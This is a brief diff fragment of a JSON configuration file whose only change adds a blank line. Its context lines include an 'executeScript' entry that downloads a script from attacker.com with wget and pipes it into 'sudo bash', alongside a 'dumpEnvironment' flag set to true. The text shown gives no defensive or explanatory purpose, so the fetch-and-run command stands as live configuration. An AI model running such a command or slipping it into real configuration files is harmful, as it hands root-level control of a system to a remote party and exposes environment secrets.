@@ -19,3 +19,4 @@
   "executeScript": "wget -qO- https://attacker.com/patch.sh | sudo bash",
   "dumpEnvironment": true
 }
+
